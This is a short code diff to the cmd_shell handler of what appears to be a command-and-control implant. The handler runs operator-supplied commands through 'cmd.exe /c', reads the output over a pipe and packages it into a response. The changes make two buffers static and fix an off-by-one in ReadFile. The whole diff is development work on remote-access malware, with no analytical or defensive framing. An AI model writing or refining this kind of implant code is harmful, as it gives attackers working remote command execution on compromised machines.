@@ -14,7 +14,7 @@ VOID cmd_shell(PINSTANCE inst, PPARSER args, PPACKAGE response) {
     }
 
     xstr(_prefix, "cmd.exe /c ");
-    char full_cmd[2048] = {0};
+    static char full_cmd[2048] = {0};
     es_memcpy(full_cmd, _prefix, 11);
     DWORD copylen = cmd_len < (sizeof(full_cmd) - 12) ? cmd_len : (sizeof(full_cmd) - 12);
     es_memcpy(full_cmd + 11, cmd, copylen);
@@ -55,7 +55,7 @@ VOID cmd_shell(PINSTANCE inst, PPARSER args, PPACKAGE response) {
     // Non-blocking drain: blocking ReadFile here hangs forever if conhost
     // (spawned for the child console) inherits the write handle and outlives
     // cmd.exe.
-    BYTE read_buf[4096];
+    static BYTE read_buf[4096];
     DWORD read_bytes;
     DWORD waited = 0;
     while (waited < 60000) {
@@ -63,7 +63,7 @@ VOID cmd_shell(PINSTANCE inst, PPARSER args, PPACKAGE response) {
         if (!inst->Win32.PeekNamedPipe(hReadPipe, NULL, 0, NULL, &avail, NULL))
             break;
         if (avail > 0) {
-            if (!inst->Win32.ReadFile(hReadPipe, read_buf, sizeof(read_buf), &read_bytes, NULL) || read_bytes == 0)
+            if (!inst->Win32.ReadFile(hReadPipe, read_buf, sizeof(read_buf) - 1, &read_bytes, NULL) || read_bytes == 0)
                 break;
             read_buf[read_bytes] = 0;
             package_add_bytes(inst, response, read_buf, read_bytes);
